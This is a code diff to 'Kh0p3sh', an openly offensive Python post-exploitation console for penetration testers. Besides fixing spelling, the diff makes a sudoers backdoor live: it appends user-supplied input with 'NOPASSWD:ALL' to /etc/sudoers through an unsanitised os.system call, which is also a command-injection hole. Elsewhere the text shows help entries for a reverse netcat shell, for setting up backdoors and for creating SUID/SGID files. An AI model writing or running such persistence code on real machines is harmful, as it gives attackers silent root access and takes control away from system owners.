@@ -21,6 +21,9 @@ Developed By Akshay Rohatgi [2020]
 print('Welcome to Kh0p3sh, a commandline tool built for penetration testers.')
 print('======================================================================')
 
+print('For best results run this script as sudo or a binary/service with high level permissions.')
+print('\n')
+
 print('Kh0p3sh Console:')
 print('For list of commands type help')
 
@@ -49,15 +52,15 @@ while True:
     findSUID - will list all SUID files found
     findSGID - will list all SGID files found
     getRules - will list all iptables rules
-    memCheck - will check for any memory security measures in place (useful for pwning or privelage escalation)
+    memCheck - will check for any memory security measures in place (useful for pwning or privilege escalation)
     ==============================================
 
     ==============================================
     Persistence Commands
     ----------------------------------------------
     back - will ask you what kind if backdoor you would like to setup and will attempt to set one up
-    createSUID - will attempt to create a file with SUID priveleges
-    createSGID - will attempt to create a file with SGID priveleges
+    createSUID - will attempt to create a file with SUID privileges
+    createSGID - will attempt to create a file with SGID privileges
     ==============================================    
         ''')
 
@@ -172,7 +175,7 @@ nc {ip} {port} - will attempt to setup a reverse netcat shell on that specific p
             print('What user would you like to have sudo privileges?')
             sudoCommand = input('\033[1;31;40m' + user + '\033[0m' + '\033[1;34;40m@Kh0p3sh-console\033[0m' + '\033[1;34;40m' + '/' + 'backdoor-console\033[0m' + '\033[1;34;40m' + '/' + 'sudo\033[0m' + '>')
             try:
-                os.system('echo "' + sudoCommand + ' ALL=(ALL) NOPASSWD:ALL"')
+                os.system('echo "' + sudoCommand + ' ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers')
             except: print('There was an error attempting to create a sudoers backdoor!')
 
 #################END OF PERSISTENCE COMMANDS##################
